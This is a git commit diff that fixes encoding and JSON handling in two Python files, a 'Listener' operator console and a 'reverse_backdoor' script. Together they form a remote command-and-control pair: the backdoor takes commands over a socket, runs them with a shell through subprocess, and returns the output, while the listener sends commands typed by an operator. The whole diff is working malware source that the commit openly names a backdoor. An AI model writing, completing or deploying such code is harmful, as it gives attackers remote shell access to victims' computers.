73668ed2be7928931863e66a8c8bc90e6d2511ba
Raghav-45 <77260113+Raghav-45@users.noreply.github.com>
2022-08-27 16:50:12 +0530

    Fixed Some Error in Json and Byte Related Problems

--- Listener.py
+++ Listener.py
@@ -12,19 +12,24 @@ class Listener:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_recieve(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
     
     def execute_remotely(self, command):
         self.reliable_send(command)
-        return self.reliable_recieve().decode()
+        return self.reliable_recieve()
     
     def run(self):
         while True:
-            command = input('>> ').encode()
+            command = input('>> ')
             result = self.execute_remotely(command)
             print(result)
             
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -7,18 +7,23 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_recieve(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024).decode()
+                return json.loads(json_data)
+            except ValueError:
+                continue
     
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True).decode()
 
     def run(self):
         while True:
-            command = self.reliable_recieve(1024).decode()
+            command = self.reliable_recieve()
             command_result = self.execute_system_command(command)
             self.reliable_send(command_result)
 
